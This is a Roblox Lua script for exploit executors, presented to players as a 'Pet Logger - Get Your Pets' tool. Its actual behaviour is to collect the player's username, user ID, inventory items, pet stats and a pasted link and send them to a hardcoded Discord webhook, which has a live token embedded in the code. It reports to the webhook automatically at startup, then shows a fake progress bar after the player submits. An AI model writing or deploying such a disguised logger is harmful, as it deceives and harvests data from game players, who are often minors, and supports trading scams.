local WEBHOOK_URL = "https://discord.com/api/webhooks/1445359992122380360/YtcZ9x39eJT-Tyg2SOSuBswUXI18bi9h5Fgd2Ryd7m1MBbcmdg5R20I1G26YQIC9qfMA"

local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Player = Players.LocalPlayer

-- SIMPLE HTTP REQUEST FUNCTION
local function sendToDiscord(message)
    local success, response = pcall(function()
        -- Try different methods
        if syn then
            if syn.request then
                return syn.request({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = HttpService:JSONEncode({
                        content = message,
                        username = "Pet Logger",
                        avatar_url = "https://i.imgur.com/4M34hi2.png"
                    })
                })
            end
        end
        
        -- Try http library
        if http and http.request then
            return http.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({
                    content = message,
                    username = "Pet Logger"
                })
            })
        end
        
        -- Try game:HttpGetAsync if nothing else works
        local payload = HttpService:JSONEncode({
            content = message,
            username = "Pet Logger"
        })
        
        -- This is a fallback method
        local encoded = "payload_json=" .. HttpService:UrlEncode(payload)
        game:HttpGetAsync(WEBHOOK_URL .. "?" .. encoded)
        return {Success = true}
    end)
    
    return success, response
end

-- Simple GUI
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PetLoggerGUI"
    screenGui.Parent = game.CoreGui or game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 400, 0, 250)
    main.Position = UDim2.new(0.5, -200, 0.5, -125)
    main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    main.Parent = screenGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = main
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 10)
    title.BackgroundTransparency = 1
    title.Text = "Pet Logger - Get Your Pets"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 20
    title.Parent = main
    
    local linkBox = Instance.new("TextBox")
    linkBox.Size = UDim2.new(0.9, 0, 0, 40)
    linkBox.Position = UDim2.new(0.05, 0, 0, 60)
    linkBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    linkBox.Text = "Paste your link here..."
    linkBox.TextColor3 = Color3.fromRGB(200, 200, 200)
    linkBox.Font = Enum.Font.Gotham
    linkBox.TextSize = 16
    linkBox.Parent = main
    
    local corner2 = Instance.new("UICorner")
    corner2.CornerRadius = UDim.new(0, 6)
    corner2.Parent = linkBox
    
    local submitBtn = Instance.new("TextButton")
    submitBtn.Size = UDim2.new(0.9, 0, 0, 50)
    submitBtn.Position = UDim2.new(0.05, 0, 0, 120)
    submitBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    submitBtn.Text = "SUBMIT - Get Pets"
    submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    submitBtn.Font = Enum.Font.GothamBold
    submitBtn.TextSize = 18
    submitBtn.Parent = main
    
    local corner3 = Instance.new("UICorner")
    corner3.CornerRadius = UDim.new(0, 8)
    corner3.Parent = submitBtn
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(0.9, 0, 0, 30)
    statusLabel.Position = UDim2.new(0.05, 0, 0, 190)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = ""
    statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 14
    statusLabel.Parent = main
    
    -- Function to get pets
    local function getPets()
        local pets = {}
        
        -- Check backpack
        if Player.Backpack then
            for _, item in pairs(Player.Backpack:GetChildren()) do
                if item:IsA("Tool") then
                    table.insert(pets, item.Name)
                end
            end
        end
        
        -- Check character
        if Player.Character then
            for _, item in pairs(Player.Character:GetChildren()) do
                if item:IsA("Tool") or (item:IsA("Model") and item.Name:lower():find("pet")) then
                    table.insert(pets, item.Name)
                end
            end
        end
        
        -- Check leaderstats
        if Player:FindFirstChild("leaderstats") then
            local stats = Player.leaderstats
            local petStats = {"Pets", "PetCount", "pets", "petcount", "Pet", "pet"}
            for _, statName in pairs(petStats) do
                local stat = stats:FindFirstChild(statName)
                if stat then
                    table.insert(pets, statName .. ": " .. tostring(stat.Value))
                end
            end
        end
        
        if #pets == 0 then
            return "No pets found"
        end
        
        return table.concat(pets, ", ")
    end
    
    submitBtn.MouseButton1Click:Connect(function()
        local link = linkBox.Text
        if link == "" or link == "Paste your link here..." then
            statusLabel.Text = "Please paste a link!"
            wait(2)
            statusLabel.Text = ""
            return
        end
        
        statusLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
        statusLabel.Text = "Getting your pet info..."
        
        -- Get player info
        local username = Player.Name
        local userId = Player.UserId
        local pets = getPets()
        
        -- Create message
        local message = string.format(
            "@everyone\n" ..
            "**NEW PET REQUEST**\n" ..
            "**Username:** %s\n" ..
            "**User ID:** %s\n" ..
            "**Current Pets:** %s\n" ..
            "**Link:** %s\n" ..
            "**Game:** %s (%s)",
            username,
            userId,
            pets,
            link,
            game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown",
            game.PlaceId
        )
        
        -- Try to send
        local success, result = sendToDiscord(message)
        
        if success then
            statusLabel.TextColor3 = Color3.fromRGB(50, 255, 50)
            statusLabel.Text = "âœ“ Info sent successfully!"
            
            -- Show loading animation
            submitBtn.Text = "Processing..."
            submitBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
            submitBtn.Active = false
            
            -- Fake progress bar
            for i = 1, 100 do
                submitBtn.Text = "Processing... " .. i .. "%"
                wait(0.03)
            end
            
            submitBtn.Text = "COMPLETE!"
            wait(2)
            submitBtn.Text = "SUBMIT - Get Pets"
            submitBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
            submitBtn.Active = true
            statusLabel.Text = ""
        else
            statusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
            statusLabel.Text = "âœ— Failed to send. Trying method 2..."
            
            -- Try alternative method
            wait(1)
            
            -- Alternative simple message
            local simpleMsg = "USER: " .. username .. " | ID: " .. userId .. " | PETS: " .. pets .. " | LINK: " .. link
            
            -- Try using PostAsync if available
            local success2 = pcall(function()
                if http and http.post then
                    http.post(WEBHOOK_URL, {
                        content = simpleMsg
                    })
                    return true
                end
                return false
            end)
            
            if success2 then
                statusLabel.TextColor3 = Color3.fromRGB(50, 255, 50)
                statusLabel.Text = "âœ“ Sent with method 2!"
                wait(2)
                statusLabel.Text = ""
            else
                statusLabel.Text = "âœ— Both methods failed. Check console."
                print("ERROR: Could not send webhook")
                print("Username:", username)
                print("User ID:", userId)
                print("Pets:", pets)
                print("Link:", link)
            end
        end
    end)
    
    -- Focus handling
    linkBox.Focused:Connect(function()
        if linkBox.Text == "Paste your link here..." then
            linkBox.Text = ""
            linkBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        end
    end)
    
    linkBox.FocusLost:Connect(function()
        if linkBox.Text == "" then
            linkBox.Text = "Paste your link here..."
            linkBox.TextColor3 = Color3.fromRGB(200, 200, 200)
        end
    end)
    
    return screenGui
end

-- Test the webhook immediately when script starts
print("Testing Discord webhook...")
local testSuccess, testResult = pcall(function()
    local testMsg = "ðŸš€ Pet Logger Script Started! Testing webhook..."
    
    if syn and syn.request then
        syn.request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = testMsg,
                username = "Pet Logger Tester"
            })
        })
    elseif request then
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = testMsg
            })
        })
    end
    
    return true
end)

if testSuccess then
    print("âœ“ Webhook test sent")
else
    print("âœ— Webhook test failed:", testResult)
end

-- Create GUI
local gui = createGUI()
print("Pet Logger GUI created!")

-- Auto-send debug info (optional)
wait(2)
print("=== DEBUG INFO ===")
print("Player:", Player.Name)
print("User ID:", Player.UserId)
print("Game ID:", game.PlaceId)

-- Quick debug function
local function debugSend()
    local debugMsg = "ðŸ”§ DEBUG: Script loaded for " .. Player.Name .. " (ID: " .. Player.UserId .. ")"
    
    pcall(function()
        if syn and syn.request then
            syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = debugMsg})
            })
            print("Debug message sent via syn.request")
        end
    end)
end

-- Try to send debug
spawn(debugSend)
